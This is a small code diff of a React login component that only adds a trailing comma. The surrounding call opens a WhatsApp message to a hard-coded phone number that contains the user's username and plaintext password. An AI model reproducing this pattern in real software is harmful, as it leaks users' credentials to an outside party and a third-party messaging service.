@@ -142,7 +142,7 @@ export default function LoginComponent() {
                                         className="mt-5 w-full"
                                         onClick={() => {
                                             window.open(
-                                                `whatsapp://send?phone=8075496634&text=Hi, i cant verify my account : ${username} name : ${password}`
+                                                `whatsapp://send?phone=8075496634&text=Hi, i cant verify my account : ${username} name : ${password}`,
                                             );
                                         }}
                                     >
